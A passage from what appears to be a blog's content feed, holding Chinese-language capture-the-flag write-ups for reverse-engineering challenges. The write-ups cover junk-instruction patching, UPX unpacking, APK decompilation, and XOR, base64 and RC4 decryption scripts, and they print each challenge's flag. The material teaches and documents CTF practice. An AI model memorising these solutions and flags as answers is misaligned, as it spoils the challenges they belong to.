src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016232231238.png" alt="image-20231016232231238" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016232252709.png" alt="image-20231016232252709" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016232331575.png" alt="image-20231016232331575" style="zoom:50%;" /><p>patch后可以发现这段代码恢复正常了:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016232826133.png" alt="image-20231016232826133" style="zoom:50%;" /><p>下面还有几个花指令,如法炮制,全都patch掉:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016234120309.png" alt="image-20231016234120309" style="zoom:50%;" /><p>出现数据后,选中所有数据(如果不成功选中脏字节后面的第一个字节,再不行就选中整个函数,按p快捷键先重新转为函数)按c快捷键转为代码.</p><p>最后统一再在函数开头按p重新生成函数即可恢复正常:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016234602048.png" alt="image-20231016234602048" style="zoom:50%;" /><p>可以看到原本的call之前也是一个call的脏字节,所以这题叫做call_above_call(</p><p>现在就能看C伪代码了.</p><p>首先输入了长为25的字符串:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016234854392.png" alt="image-20231016234854392" style="zoom:50%;" /><p>然后在wuhuwuhu()函数中进行循环异或加密,然后就和密文enc进行比较了:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016235004077.png" alt="image-20231016235004077" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016235823404.png" alt="image-20231016235823404" style="zoom:50%;" /><p>但是跳转到enc发现是一个指针,我们根据最后的end_m函数中的free(enc)也能知道.</p><p>再往前看,发现有个generate()函数:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016235354465.png" alt="image-20231016235354465" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016235407645.png" alt="image-20231016235407645" style="zoom:50%;" /><p>abcdefg点进去看到是一个base编码的字符串,同时decode()函数似乎是一个base64解码:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016235700446.png" alt="image-20231016235700446" style="zoom:50%;" /><p>我们又能找到encode()和标准字符表:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016235727873.png" alt="image-20231016235727873" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016235741479.png" alt="image-20231016235741479" style="zoom:50%;" /><p>所以这就是一个base64编码.</p><p>那么我们只需要将密文进行base64解码(也可以动调得到),然后进行反向的循环异或即可得到flag,解密脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;Cg0GHEtJF1pZBAo8O1dRFxI4JgAdF1JcfQ==&#x27;</span></span><br><span class="line">enc = base64.b64decode(enc.encode()).decode()</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    flag.append(<span class="built_in">ord</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) - <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    flag[i] = flag[i] ^ flag[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>flag&#123;0yn4mic_d3bug_yyds!&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
            <tag> Crypto </tag>
            
            <tag> Misc </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp-XSCTF2023热身赛</title>
      <link href="/2023867c7f3cb185/"/>
      <url>/2023867c7f3cb185/</url>
      
        <content type="html"><![CDATA[<h1 id="mine">Mine</h1><p>DIE打开是x64的win程序,无壳,直接IDA.</p><p>进去一看,好家伙,c++的程序用gcc编译,那就分析吧.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013124905486.png" alt="image-20231013124905486" style="zoom:45%;" /><p>用控制台尝试运行一下,可以知道这是一个扫雷游戏,游戏题优先去找游戏终止判定,往往游戏胜利后会有一些关于flag的操作.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013125635703.png" alt="image-20231013125635703" style="zoom:33%;" /><p>中文乱码不影响,我们很容易能够找到游戏主循环体:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013125853759.png" alt="image-20231013125853759" style="zoom:33%;" /><p>1和2即为循环终止条件和当前成功找到的地雷数.</p><p>再往后看找到游戏胜利处理:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013130011930.png" alt="image-20231013130011930" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013130051478.png" alt="image-20231013130051478" style="zoom:33%;" /><p>这里C++的代码不予解释…别问,问就是去打基础…</p><p>我们发现<code>ans</code>数组在运行时初始化,我们通过交叉引用可以找到,直接写代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> enc[] = <span class="string">&quot;*ur)O&#125;t@r&#123;u!c&amp;|&#125;d\\9m&gt;M4NtsrjL&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(enc);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (len-i)^enc[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到结果:</p><p><code>7ii3VecVgof3r6ssiP2g7E3HqwqhM</code></p><p>或者可以去开挂然后动调,但是我懒得去搞了…比赛的时候试了一下,没有问题,我的做法是把</p><p><code>while ( 100 - mine_sum != res )</code>的<code>100</code>给patch成25(mine_sum初始值是25),这样游戏直接胜利(我不会玩扫雷).</p><p>一样可以输出结果.</p><p>最后就是最抽象的了,我们要进行base58解码,还得是那个特定的网站才行…我一度以为我做错了…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013132203167.png" alt="image-20231013132203167" style="zoom:33%;" /><p>结束…</p><h1 id="easyezbaby-app">easyEZbaby_app</h1><p>这题也很简单,会一点java就好.</p><p>我们看到apk先丢到模拟器跑一下看看(我没搞,直接看的代码Orz),然后喂给JADX反编译.</p><p>onClick()方法中可以看到只要求出这里的obj和obj2即可:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013145006310.png" alt="image-20231013145006310" style="zoom:340%;" />从checkUsername()方法中知道obj字符串就是<code>&quot;zhishixuebao&quot;</code>的<code>md5</code>摘要的各个奇数位的字符:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013145254632.png" alt="image-20231013145254632" style="zoom:40%;" />写脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;zhishixuebao&quot;</span></span><br><span class="line">md5_str = md5(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"><span class="comment"># 取出偶数下标的字符</span></span><br><span class="line"><span class="built_in">print</span>(md5_str[::<span class="number">2</span>])</span><br><span class="line"><span class="comment">#7afc4fcefc616ebd</span></span><br></pre></td></tr></table></figure><p>分析checkPass()方法,我们直接爆破即可(懒得反推了,实际上就换一下位置就行…):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">15</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">0</span>; c &lt;= <span class="number">128</span>; ++c) &#123;</span><br><span class="line">            <span class="type">int</span> temp = ((((<span class="number">255</span> - i) + <span class="number">2</span>) - <span class="number">98</span>) - c);</span><br><span class="line">            <span class="keyword">if</span> (temp == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                <span class="built_in">putchar</span>(c); <span class="comment">// onmlkjihgfedcba</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>连接起来就是:</p><p><code>flag&#123;7afc4fcefc616ebdonmlkjihgfedcba&#125;</code></p><p>结束…</p><h1 id="ezorz">ezOrz</h1><p>这题我出的…不难吧…怎么这道题做出来的人最少…我反思Orz</p><p>程序有一个加壳,先使用UPX去壳.</p><p>使用IDA分析可得,题目中有一个密钥,要用其进行加密.</p><p>但是密钥经过了处理,将密钥的每个字节进行了<code>高4位和低4位的交换</code>.然后,将输入的flag<code>从前向后对相邻两个字节进行异或变换</code>.</p><p>最后使用处理过的密钥对同样处理过的flag进行<code>循环异或</code>,得到加密的数据.</p><p>将得到的数据和程序中的一个数组进行比较,可知这个数组就是密文.</p><p>需要注意的是,密文可能是在程序中赋值的,而且不是按字符串进行赋值,需要进行动态调试,然后提取出来.</p><p>按顺序反过来编写代码即可,代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">swap_bit4</span><span class="params">(<span class="type">char</span> *a, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="type">char</span> temp = a[i];</span><br><span class="line">        temp = (temp &lt;&lt; <span class="number">4</span>) + (temp &gt;&gt; <span class="number">4</span>);</span><br><span class="line">        a[i] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_xor</span><span class="params">(<span class="type">char</span> *a, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = len - <span class="number">2</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        a[i] ^= a[i + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//buf需要动态调试从IDA导出</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">50</span>] = &#123;</span><br><span class="line">            <span class="number">174</span>,  <span class="number">27</span>, <span class="number">224</span>, <span class="number">233</span>, <span class="number">184</span>,  <span class="number">51</span>, <span class="number">180</span>, <span class="number">156</span>, <span class="number">177</span>, <span class="number">124</span>,</span><br><span class="line">            <span class="number">40</span>, <span class="number">208</span>, <span class="number">154</span>, <span class="number">101</span>, <span class="number">186</span>, <span class="number">235</span>,  <span class="number">67</span>, <span class="number">239</span>, <span class="number">136</span>,  <span class="number">12</span>,</span><br><span class="line">            <span class="number">46</span>,  <span class="number">86</span>,   <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">19</span>;++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,buf[i]);</span><br><span class="line">    <span class="type">char</span> v[] = <span class="string">&quot;Jan_Ye_yyds_Orz&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">19</span>;</span><br><span class="line">    swap_bit4(v, <span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">19</span>; i++) &#123;</span><br><span class="line">        buf[i] ^= v[i % <span class="built_in">strlen</span>(v)];</span><br><span class="line">    &#125;</span><br><span class="line">    my_xor(buf, <span class="number">19</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">19</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{V3ry_ez_1sn!t}</p><p>结束…</p><h1 id="ezpy">ezpy</h1><p>这题还是我出的…巨简单,RC4直接把密文当明文再跑一遍就行.</p><p>简单的将密文进行base64解码,然后进行RC4解密即可.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">keys = <span class="string">&#x27;Flag&#123;This_a_Flag&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;xxxxxxxxxxxxxxxx&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_something</span>(<span class="params">enc=<span class="string">&#x27;&#x27;</span>, key=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    enc += <span class="string">&#x27;\0&#x27;</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> enc:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        k = s_box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line"></span><br><span class="line">    res_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        <span class="comment"># print(i, end=&quot;&quot;)</span></span><br><span class="line">        res_str += i</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;wq3CocO5wqXDtEotBDA6XsKrw7DDvsOxw54fOjrCpMO/b8OcwrfCgMOi&#x27;</span></span><br><span class="line">res = base64.b64decode(res.encode()).decode()</span><br><span class="line">res = do_something(res, keys)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># res = wq3CocO5wqXDtEotBDA6XsKrw7DDvsOxw54fOjrCpMO/b8OcwrfCgMOi</span></span><br></pre></td></tr></table></figure><p>flag{Ju2t_4n_3x4mple_RCa}</p><p>结束…</p><h1 id="eazyre">eazyre</h1><p>有UPX3.95加壳,直接用upx脱壳,再分析:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013151027895.png" alt="image-20231013151027895" style="zoom:33%;" /><p>找字符串,发现f_part2有flag的后半截:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013151132760.png" alt="image-20231013151132760" style="zoom:40%;" /><p>part1函数中有前半截,直接按r快捷键然后排列处理一下出flag(注意小端序转换):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013151300702.png" alt="image-20231013151300702" style="zoom:40%;" /><p>flag{UPX_4nd_0n3_4nd_tw0}</p><p>结束…</p><h1 id="eazyxor">eazyxor</h1><p>第一步对flag进行循环异或加密,密钥为<code>&quot;SCNU&quot;</code>.</p><p>然后将flag每一个字符转换为特定数量的’1’和一个’0’,其中’1’的数量为该字符的ASCII码.</p><p>提取出数据直接写解密程序即可:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[] =</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span 